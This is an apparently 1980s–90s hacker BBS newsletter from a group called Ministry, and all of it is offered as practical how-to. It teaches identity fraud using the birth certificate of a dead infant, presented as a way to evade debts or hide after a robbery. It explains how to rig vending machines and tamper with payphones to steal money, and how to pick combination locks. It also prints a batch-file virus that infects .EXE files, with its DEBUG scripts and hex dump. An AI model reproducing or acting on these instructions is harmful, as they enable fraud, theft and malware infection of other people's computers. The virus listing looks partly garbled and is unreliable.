Okay  everybody.  We actually made it to a second newsletter!!  Well, a lot
of people congratulated us on our first newsletter and it wasn't even  that
great!!   Well, this one will definitely be better folks.  trust me on that
one.  We are accepting people into MINISTRY now.  Call one  of  the  Boards
listed  above  (all  /Wasea/  and available on your local pirate board) and
either fill out an application, or ask  the  sysop.   We  will  ask  a  few
questions,  check  with  everyone  else in the group, and then give you our
answer.  We will also be inviting special people into the group.

   /||-| OW TO CHANGE YOUR IDENTITY FOR GOOD (AND NOT GET CAUGHT!)
    || |
   // /

    So  you want to change your identity huh?  You "forgot" to pay the loan
    shark?  You "accidentally" went into a bank with a gun and took all the
    money?  Well, here's some good ways of disguising yourself  as  a  real
    person,  and  not  get  found  by  people,  relatives, friends, private
    detectives, etc...

    First of all, MOVE to a different  city  and  state.   Preferably,  one
    where  you  know  NO  ONE!!!  You could accidentally meet a friend in a
    city where lots of people lived and all  it  takes  is  one  friend  to
    spread the word.

    Second,  REMOVE  or  DISGUISE any special characteristics that pull you
    apart from the crowd.  Blend in well.

    Third, go to the Social Security or Dept.  of  Records.   Search  Death
    certificates  until  you  find  a baby that died VERY soon after it was
    born.  Then pay the $10 or  so  for  the  BIRTH  certificate  for  that
    person.   With  that  birth  certificate,  you are eligible to obtain a
    voter's registration card.  With these two  pieces  of  identification,
    you  may  get  a  social  security  card.   With those 3, you can get a
    driver's liscense.  You are home free from there.

    Fourth, if you have any HOBBIES, try to keep them PRIVATE.  Many people
    get caught because they were on page 24 of 'The Fishing  Home  Journal'
    or something.

    Fifth,  Unlisted numbers.  This won't keep a persistent person away for
    long, but it will keep away unwanted individuals without the  reSOURCES
    to get such information.

    That  should  pretty  much keep you from being caught.  Again, I cannot
    stress how much you should REMAIN QUIET AND KEEP A LOW PROFILE.   Don't
    run for governor or anything.

    You  need  some ideas.  School has started and you have nothing to show
    for it.  Now, it gets boring after a while, but school is only as  much
    fun as you make it to be.  Here are some ways to have fun and get RICH!
    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    POP MACHINES:
    If  you  have  an  older  or  used  pop  machine,  then this will work.
    Otherwise, beat it until it does.  You need to find any button  on  the
    machine  that  will push in and move to one of the sides and stay stuck
    behind it (an un-noticable amount.)  Then stand back.  People will  put
    money  in and push their favorite pop button, but nothing will come out
    but the button you have stuck.  If the button you moved  was  out  (the
    little light was on,) then it will not give them anything and they will
    not be able to get their money back.  When they go to tell some janitor
    or  something  is  your  chance  to go fix the button, coin return, and
    change galoure!!!


    PAY PHONE:
    Peel back the rubber cover that goes  from  the  wire  to  the  handset
    (located  right belkow the mouthpiece.)  Take your wirecutters and snip
    then red wire.  Peel it away so it does not touch  itself.   fix  cover
    and  leave.   Next  day,  come  back  and  touoch  the  wires together.
    Depending on how many people  used  (or  tried  to  use)  the  payphone
    depneds  on  how  much money you get back!  Do it before a big football
    game or a dance.

    -----------------------------------------------------------------------
    PICKING LOCKS:
     [>This is originally taken from PHRACK #1<]

    Picking MASTER Combination Locks

    To pick MASTER locks (and I am wondering if lockers work  on  the  same
    principal...) you must go through THREE (3) steps.

    [STEP  1>  Pull  on the horseshoe shaped "handle."  Hard enough so that
    the knob moves roughly, but still moves.  Then turn  the  knob  to  the
    left until it won't move anymore.  Add -5- to this number.  Congrats on
    getting the first number!

    [STEP 2> Spin the dial to the left a few times until you get to the 1st
    number. Then turn right until you come to the 1st number again. Pull up
    on  the  handle  and turn.  If it stops, then try to see if it is stuck
    good or just clicking.  If it is locked there, then you  have  the  2nd
    number!!

    [STEP  3>  Spin  a  few to clear and go right to the first number, then
    around once and then to the 2nd number.   then  go  opposite  direction
    pulling up once at each number.  Eventually it will pop open!  It takes
    practice so keep trying!

- How to write a VIRUS using BATCH files.
-
-  Rewritten by Sam Hain for -=Ministry=-
-
-

    This virus will only attack .EXE files.  After the execution you will
    see a .INH file which contains the directory, and the file %SORT.EXE.
    Programs which start with '%' are NOT infected and pose as backups...

    This virus is written in 3 .BATch files.one does the actual DOS
    commands, while hte other two help to write the virus itself and spread
    it.  The system MUST have DEBUG and EDLIN on the disk to work
    correctly.


    FILE #1:
    Name : VR.BAT

    echo off         }turns echo off
    ctty nul         }turns console output off
    path c:\dos      }may be different on the system infecting
    dir *.com/w>ind  }the Dir is written on "ind" ONLY files
    edlin ind<1      }"IND" is processed with EDLIN
    debug<2          }new batch prgm is created with debug
    edlin name.bat<3 }this batch goes EXE because of EDLIN
    ctty con         } console interface once again on
    name             }newly created NAME.BAT is called


    FILE #2:
    Name:1
    1,4d   }lines 1-4 of IND file are erased
    e      }saves file to disk


    FILE #3:
    Name:2
    m100,10b,f000
    e108 ".BAT"
    m100,10b,f010
    e100"DEL "     }This does all the debug stuff
    mf000,f00b,104
    e10c 2e
    e110 0d,0a
    mf010,f020,11f
    e112 "COPY \VR.BAT"
    e12b od,0a
    rxc
    2c
    nname.bat
    w
    q


    FILE #4:
    Name:3
    ---------THIS FILE MUST BE PRINTED AS A HEX DUMB BECAUSE IT CONTAINS
    TWO CONTROL CHARACTERS AND THIS IS NOT ENTIRELY PRINTABLE-----------

    0100   31 2C 31 3F 52 20 1A 0D-6E 79 79 79 79 79 79 79
           1  ,  1  ?        .  .  N  Y  Y  Y  Y  Y  Y  Y

           Y  Y  Y  Y    .  E   .  .  .  .  .  .  .  .  .


    In order for this virus to work, VR.BAT should be in the root
    Directory.  Possibly have it move itself there when run.

    Well, That's about it for this issue.  Next month, be looking out for
    the -=Ministry=- Annoyance Dialer.  Very good for people whom you
    aren't very happy with.  Also!  -=Ministry=- BBS program is coming out
    soon.  NOT another FORUM-PC clone either.  Hotel Chelsea is down
    temporarily until I can find a GOOD bbs program to run.  Preferably
    with Networking built in, but not necessary.  Please upload it to
    either ULTERIOR MOTVIES (who is also down due to a virus or something
    screwing witht he FAT table) or FUNGUS LAND.  Get the numbers off of
    your local boards.  BY THE WAY - I downloaded from a board the other
    day, a program that had billions and billions of pirate board numbers.
    Mine included (when we pirated.)  I can't believe anyone would do this.
    If just ONE person got ahold of it who didn't believe in it, imagine
    the busts...  It's like, PHRY CODE PLUS.  All these do-gooder PcPursuit
    users were uploading it on the support system.  Not cool guys.  I still
    need some people to give me some good stuff for December.  I'll take
    whatever you can write.
